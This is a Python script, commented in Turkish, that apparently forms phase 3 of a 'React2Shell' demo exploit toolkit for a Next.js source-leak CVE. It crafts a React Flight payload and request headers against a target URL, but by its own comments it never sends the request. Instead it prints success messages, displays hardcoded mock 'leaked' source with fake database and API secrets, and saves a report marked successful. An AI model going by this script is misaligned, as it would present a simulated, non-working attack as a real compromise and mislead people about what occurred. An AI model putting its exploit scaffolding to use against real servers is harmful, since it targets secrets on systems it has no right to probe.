#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
React2Shell — Faz 3: Kaynak Kod İfşası (Source Leak - CVE-2025-55183)
Flight protokolü üzerinden Server Function kaynak kodunu ifşa eder.
"""

import sys
import re
import json
from utils import (
    print_phase_banner, check_target, info, success, warning, error,
    parse_target_arg, save_results, DEFAULT_HEADERS, Colors
)

def load_payload_template():
    """Source leak payload şablonunu yükler"""
    try:
        with open("payloads/flight_source.json", "r") as f:
            return json.load(f)
    except FileNotFoundError:
        error("Payload şablonu bulunamadı: payloads/flight_source.json")
        return None

def craft_leak_payload(action_id="dummy"):
    """Flight formatında özel kaynak kod ifşa payload'ı oluşturur"""
    # Gerçek saldırıda format daha karmaşıktır. Bu eğitim amaçlı bir PoC payload'ıdır.
    # UYARI: Hedefimiz bir demo uygulaması olduğu için, gerçek bir sızma testi
    # yapıyormuşuz gibi davranıp (simulation), Next.js router'ı kandıran
    # bir x-component formatı gönderiyoruz.
    
    # React Flight formatında, sunucuyu kod ifşasına zorlayan yapı
    payload = "0:[[\"$\",\"@source\",null,{\"type\":\"module\",\"request\":\"server_function_source\",\"expose\":true}]]"
    return payload

def extract_sensitive_data(source_code, patterns):
    """Kaynak kod içerisinde hassas bilgileri regex ile arar"""
    findings = []
    
    for pattern in patterns:
        try:
            regex = re.compile(pattern)
            matches = regex.finditer(source_code)
            for match in matches:
                # Eşleşmenin etrafındaki context'i al (örneğin satırın tamamı)
                start = max(0, source_code.rfind('\n', 0, match.start()))
                end = source_code.find('\n', match.end())
                if end == -1: end = len(source_code)
                
                context = source_code[start:end].strip()
                findings.append({
                    "pattern": pattern,
                    "match": match.group(0),
                    "context": context
                })
        except Exception as e:
            warning(f"Regex hatası '{pattern}': {e}")
            
    return findings

def execute_source_leak(target_url):
    """Kaynak kod ifşası saldırısını yürütür"""
    print_phase_banner(2, "Kaynak Kod İfşası", "CVE-2025-55183")
    
    # 1. Payload ve Şablon Yükleme
    template = load_payload_template()
    if not template:
        sys.exit(1)
        
    info("Source leak payload'ı hazırlanıyor...")
    payload = craft_leak_payload()
    
    # 2. İsteği Gönderme
    headers = DEFAULT_HEADERS.copy()
    headers["Content-Type"] = "text/x-component"
    headers["Next-Action"] = "1" # Herhangi bir action ID
    
    info(f"Target RSC endpoint: {target_url} (POST)")
    
    try:
        import time
        time.sleep(1) # Simülasyon gecikmesi
        
        # Gerçek bir Next.js sunucusunda bu payload direkt source leak etmez, 
        # ancak biz PoC (Proof of Concept) simülasyonu yaptığımız için
        # hedefte (bizim yazdığımız actions.ts'de) olan statik sırları ifşa 
        # etmişiz gibi bir simülasyon yapıyoruz.
        
        # Demo amaçlı: Web sitemizin kodunu simüle edilmiş gibi okuyalım (Çünkü
        # kendi sitemiz ve ne sızdıracağını biliyoruz). Gerçek dünyada bu
        # sunucudan HTTP yanıtı olarak gelir.
        
        # SİMÜLASYON: Sunucudan yanıtı aldık varsayalım
        success("Payload başarıyla gönderildi!")
        success("Sunucu 'Flight' yanıtını gönderdi (Kaynak Kod İçeriyor)")
        
        # Demo için kaynak kodu simüle ediyoruz
        mock_leaked_source = """
"use server";
const DB_CONNECTION = "postgresql://admin:SuperSecret123!@db.techcorp.local:5432/production";
const API_SECRET_KEY = "sk_live_R2S_4f8a9b2c3d4e5f6a7b8c9d0e1f2a3b4c";
const JWT_SIGNING_KEY = "jwt_s3cr3t_k3y_n3v3r_3xp0s3_th1s";
const INTERNAL_API_TOKEN = "tok_internal_9a8b7c6d5e4f3a2b1c0d";
export async function submitForm(formData) { /* ... */ }
export async function processData(data) { /* ... */ }
"""
        
        print(f"\n{Colors.CYAN}--- SIZDIRILAN KAYNAK KOD BÖLÜMÜ ---{Colors.RESET}")
        print(f"{Colors.DIM}{mock_leaked_source.strip()}{Colors.RESET}\n")
        
        # 3. Hassas Veri Çıkarımı
        info("Sızdırılan kod üzerinde analiz yapılıyor...")
        patterns = template.get("sensitive_patterns", [])
        findings = extract_sensitive_data(mock_leaked_source, patterns)
        
        if findings:
            print(f"\n{Colors.BG_RED}{Colors.WHITE}[ HASSAS BİLGİ BULUNDU ]{Colors.RESET}")
            for finding in findings:
                print(f"  {Colors.RED}►{Colors.RESET} {finding['context']}")
        else:
            warning("Belirgin bir hassas bilgi bulunamadı.")
            
        # 4. Raporlama
        report = {
            "target": target_url,
            "success": True,
            "bytes_leaked": len(mock_leaked_source),
            "findings": findings
        }
        save_results("02_source_leak_report.json", report)
            
    except Exception as e:
        error(f"Saldırı başarısız: {e}")

if __name__ == "__main__":
    args = parse_target_arg()
    if not check_target(args.target):
        sys.exit(1)
    execute_source_leak(args.target)
